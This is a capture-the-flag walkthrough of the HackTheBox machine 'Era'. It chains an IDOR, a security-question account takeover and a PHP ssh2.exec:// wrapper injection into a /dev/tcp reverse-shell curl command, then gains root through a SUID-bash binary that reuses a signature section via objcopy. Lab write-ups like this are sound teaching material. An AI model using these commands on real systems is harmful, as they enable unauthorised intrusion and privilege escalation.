---
title: Era
categories: [HackTheBox]
tags: [web, php, idor, passwordcracking, php-wrappers, ssh2, rce, objcopy]
media_subpath: /images/hackthebox_era/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/fcd00b2542a936e4281ba19e0bd0b025.png'
---

## Summary

**Era** is a web-focused HackTheBox Linux machine with a neat privilege escalation twist on a custom "AV" monitoring binary. The attack chain starts on a web application that uses security questions for authentication and exposes a file-download functionality. We first discover a security question vulnerability that allows changing answers for any user. We then focus on the file download functionality and discover that fuzzing the numeric `id` parameter reveals valid file IDs, including a site backup. Downloading this backup exposes a SQLite database containing user information, from which we extract the admin username (`admin_ef01cab31aa`). While examining the backup source code, we discover a **PHP stream wrapper** injection vulnerability in the file preview feature, though it requires admin access to exploit. We then exploit the security question vulnerability to reset the admin's security question answers, allowing us to change their password via the password reset flow. With admin access, we abuse the `ssh2.exec://` wrapper to pivot into SSH and obtain code execution as the `yuri` user. The passwords we cracked from the SQLite database are used later to pivot to the `eric` user. On the host, we observe a root-owned periodic script using `objcopy` on an AV monitoring binary. By crafting a modified `monitor` binary that preserves the expected signature section while running `chmod +s /bin/bash`, we escalate to root via a SUID bash shell.

## Initial Recon and Application Overview

The main website presents a typical web portal 

![Website](file-20250812004551339.png)

While exploring, we notice a `file.era.htb` subdomain related to file management:

![file.era.htb subdomain](file-20250812004947589.png)

The site heavily relies on **security questions** as a secondary authentication factor:

![Security questions](file-20250812005048124.png)

Users can also **register** new accounts:

![User Registration](file-20250812005235625.png)

## Security Question Logic and Weak Account-Level Controls

While testing the security question functionality, we discover a critical flaw: the endpoint that updates security answers allows us to specify **any username**, not just the currently authenticated one.

![change security questions test](file-20250812005326289.png)

This means:
- We can overwrite security question answers for arbitrary users
- Later, we can use the "forgot password / security question" flow to recover or reset their password

This vulnerability will be crucial later when we need to gain admin access.

## File Upload and Download Functionality

The file area provides an upload feature and a "download by id" feature.

![file upload](file-20250812005353960.png)

We notice a pattern:

- There is a `download.php?id=NUMBER` endpoint
- When requesting a non-existent `id`, the message differs from that of an existing file

![curl nonexist and exist id](file-20250812005533935.png)

This suggests that the application distinguishes between **valid** and **invalid** file IDs based on a database lookup. We can exploit this to enumerate valid IDs.

## Enumerating File IDs (IDOR-Style Fuzzing)

We fuzz the `id` parameter with `ffuf` to find valid file identifiers:

![ffuf with id from 1 to 10000](file-20250812005639238.png)

`ffuf` reports valid IDs – in this case, `54` and `150` stand out as interesting.

![looking fils](file-20250812005705530.png)

By manually requesting these IDs, we can see that one of them corresponds to a **site backup**.

## Downloading the Backup and Extracting Admin Username

Downloading and inspecting the backup, we find a SQLite database with user data, including password hashes:

![sqlite dump](file-20250812010129652.png)

From the database, we extract the admin username: `admin_ef01cab31aa`. We also crack some password hashes using a wordlist (e.g., `rockyou.txt`), successfully recovering passwords for two users:

![password cracked](file-20250812010519501.png)

> **Note**: These cracked passwords will be used later to pivot to other users (such as `eric`), but they are not needed for admin access.
{: .prompt-info}

## Code Review: Discovering PHP Wrapper Vulnerability

While examining the backup files, we review the source code and locate `download.php` implementing the file-download and preview logic:

```php
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        height: 80vh; 
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}

if (!isset($_GET['id'])) {
    header('location: index.php'); // user loaded without requesting file by id
    die();
}

if (!is_numeric($_GET['id'])) {
    header('location: index.php'); // user requested non-numeric (invalid) file id
    die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
    echo deliverTop("Era - Download");

    echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

    echo deliverBottom();
} else {
    $fileName = str_replace("files/", "", $fetched[0]);

    // Allow immediate file download
    if ($_GET['dl'] === "true") {

        header('Content-Type: application/octet-stream');
        header("Content-Transfer-Encoding: Binary");
        header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
        readfile($fetched[0]);
    // BETA (Currently only available to the admin) - Showcase file instead of downloading it
    } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
        $format = isset($_GET['format']) ? $_GET['format'] : '';
        $file = $fetched[0];

        if (strpos($format, '://') !== false) {
            $wrapper = $format;
            header('Content-Type: application/octet-stream');
        } else {
            $wrapper = '';
            header('Content-Type: text/html');
        }

        try {
            $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
            $full_path = $wrapper ? $wrapper . $file : $file;
            // Debug Output
            echo "Opening: " . $full_path . "\n";
            echo $file_content;
        } catch (Exception $e) {
            echo "Error reading file: " . $e->getMessage();
        }

    // Allow simple download
    } else {
        echo deliverTop("Era - Download");
        echo deliverMiddle_download(
            "Your Download Is Ready!",
            $fileName,
            '<a href="download.php?id=' . $_GET['id'] . '&dl=true"><i class="fa fa-download fa-5x"></i></a>'
        );
    }
}
?>
```

**Key observations:**
- For `show=true` and admin sessions (`$_SESSION['erauser'] === 1`), the code supports a `format` parameter
- If `format` **contains** `://`, the code treats it as a **wrapper prefix** and prepends it to the file path:
  - `fopen($wrapper . $file, 'r')`
- There is no validation of which wrapper is being used

> **Critical Discovery**: This code allows arbitrary PHP stream wrapper injection, which can lead to remote code execution. However, this functionality is **only available to admin users** (`$_SESSION['erauser'] === 1`). We need to gain admin access first before we can exploit this vulnerability.
{: .prompt-danger}

This means we can use any PHP stream wrapper supported by the server, including potentially dangerous ones like `ssh2.exec://`, but **only after we obtain admin privileges**.

## Gaining Admin Access via Security Question Exploitation

Now that we have the admin username (`admin_ef01cab31aa`) and have discovered the PHP wrapper vulnerability in the source code, we need to gain admin access to exploit it. We exploit the security question vulnerability we discovered earlier:

1. **Reset the admin's security question answers** using the vulnerable endpoint (we can set answers for any user)
2. **Use the password reset flow** with the security questions we just set
3. **Change the admin's password** to a known value
4. **Log in as admin**

![admin login via sec questions](file-20250812010920479.png)

> **Success**: We now have admin access to the application! We can now exploit the PHP wrapper vulnerability we discovered in the source code.
{: .prompt-info}

## Achieving RCE via PHP `ssh2.exec://` Wrapper

Now that we have admin access, we can exploit the PHP wrapper vulnerability we discovered in the backup source code.

PHP's SSH2 extension supports wrappers such as `ssh2.exec://user:pass@host:port/command`. If the extension is installed and enabled, `fopen()` on such a wrapper establishes an SSH connection and executes the specified command.

Since the code builds:
- `$full_path = $wrapper . $file` when `format` contains `://`

We can set:
- `id=54` (a valid file ID from our fuzzing)
- `show=true`
- `format=ssh2.exec://yuri:mustang@127.0.0.1:22/<command>`

And send a request with our admin session cookie:

```bash
curl 'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F9999%200%3E%261%22;' \
  -b 'PHPSESSID=1mpf454innv6pbds9mrdna4pi7'
```

This payload:
- Uses `ssh2.exec://` wrapper
- Authenticates as `yuri:mustang` to `127.0.0.1:22`
- Executes a **bash reverse shell** back to our attacker machine on port `9999`

On our listener, we receive a shell as the SSH user (e.g., `yuri`), from where we can pivot further.

![RCE via wrapper](file-20250812012150626.png)

## Lateral Move to `eric`

From the foothold, we use one of the **previously cracked passwords** from the SQLite database to **su to `eric`**:

![su eric](file-20250812012250065.png)

> **Note**: This is where the passwords we cracked earlier from the SQLite database come into play - we use them to pivot to the `eric` user.
{: .prompt-info}

At this point, we have shell access as `eric` on the box.

## Privilege Escalation: Abusing the AV Monitoring Binary

We run a process monitor such as `pspy` to observe what root is doing periodically:

![pspy output](file-20250812012724870.png)

We see root executing:
- `initiate_monitoring.sh`
- `objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor`

This indicates:
- There is a custom AV/monitoring binary at `/opt/AV/periodic-checks/monitor`
- Root periodically runs `objcopy` on it, specifically on the `.text_sig` section
- There is likely an integrity-check mechanism using this section

The idea is to **replace** the `monitor` binary with our own payload, but preserve or re-inject the expected `.text_sig` section so that the integrity check passes.

### Crafting a Malicious `monitor` Binary

We can write a simple C program whose only job is to set the SUID bit on `/bin/bash`:

```c
// Program to run chmod +s /bin/bash

#include <stdio.h>
#include <stdlib.h>

int main() {
    // Execute the command to set the SUID bit on /bin/bash
    int result = system("chmod +s /bin/bash");

    // Check if the command was successful
    if (result == 0) {
        printf("Successfully set SUID bit on /bin/bash\n");
    } else {
        printf("Failed to set SUID bit on /bin/bash\n");
    }

    return 0;
}
```

Compile it on the box:

```bash
gcc monitor.c -o shell
```

Alternatively, we can generate a small ELF payload using `msfvenom`:

```bash
msfvenom -p linux/x64/exec CMD='chmod +s /bin/bash' -f elf -o shell
```

### Bypassing the Signature Check with `objcopy`

The root script uses `objcopy` to dump the `.text_sig` section from the **original** `monitor` binary. We can:

1. Dump the `.text_sig` section from the original binary
2. Add that section to our malicious payload
3. Update the real `monitor` binary with our modified version

Commands:

```bash
# 1. Dump the .text_sig section from the original monitor
objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor

# 2. Add this section to our malicious shell binary (output: mon)
objcopy --add-section .text_sig=text_sig_section.bin shell mon

# 3. Update the original monitor binary with our modified one
objcopy --update-section .text_sig=text_sig_section.bin mon monitor

# 4. Replace the original monitor with our modified version
cp monitor /opt/AV/periodic-checks/monitor
```

Full command sequence as used on the box:

```bash
eric@era:/tmp$ objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
eric@era:/tmp$ objcopy --add-section .text_sig=text_sig_section.bin shell mon
eric@era:/tmp$ objcopy --update-section .text_sig=text_sig_section.bin mon monitor
eric@era:/tmp$ cp monitor /opt/AV/periodic-checks/monitor
```

We then wait for the periodic root job to run. Once it does, our malicious `monitor` binary will be executed, and `/bin/bash` will have its SUID bit set.

We confirm:

```bash
eric@era:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Now we can spawn a root shell directly:

```bash
eric@era:/tmp$ /bin/bash -p
bash-5.1# cd
bash-5.1# ls
user.txt
bash-5.1#
```

We have full root access and the root flag.

## Conclusion

### Attack Chain Recap

- Discovered a security question vulnerability allowing password reset for any user
- Discovered a file download endpoint on `file.era.htb` with numeric IDs
- Fuzzed the `id` parameter to find valid file IDs
- Downloaded a site backup containing a SQLite database with user information
- Extracted the admin username (`admin_ef01cab31aa`) from the database
- Discovered a PHP stream wrapper injection vulnerability in the backup source code (requires admin access)
- Exploited the security question vulnerability to reset admin's security questions and change their password
- Logged in as admin and exploited the PHP wrapper vulnerability we discovered earlier
- Abused the `ssh2.exec://` wrapper to execute a reverse shell via SSH (`yuri:mustang@127.0.0.1`)
- Used previously cracked passwords from the SQLite database to pivot to user `eric`
- Observed root running `objcopy` on `/opt/AV/periodic-checks/monitor`
- Crafted a malicious `monitor` binary that sets SUID on `/bin/bash`, preserving the `.text_sig` section
- Replaced the original `monitor`, waited for the root job, and then used SUID bash to gain root

### Lessons Learned

- **IDOR and Fuzzing**: Simple numeric identifiers can expose sensitive files (backups, databases) when not properly access-controlled.
- **Backup Safety**: Application backups stored on the same host, accessible by the web layer, are high-value targets and must be protected.
- **Password Storage**: Weak or guessable passwords will fall quickly once hashes are leaked.
- **PHP Wrappers**: Allowing arbitrary wrappers (`format` parameter) without validation is extremely dangerous and often leads to RCE.
- **Monitoring / AV Binaries**: Security or monitoring tools running as root must be designed securely; integrity checks based purely on sections like `.text_sig` can be bypassed by reusing the expected section in a malicious binary.
- **SUID Binaries**: Setting SUID on `/bin/bash` remains a classic but very effective privilege escalation vector when achievable.

Era is an excellent example of how a chain of small weaknesses—ID-based file access, insecure backup storage, weak passwords, unsafe PHP wrappers, and fragile binary integrity checks—can be combined into a full compromise from unauthenticated web access to root shell.
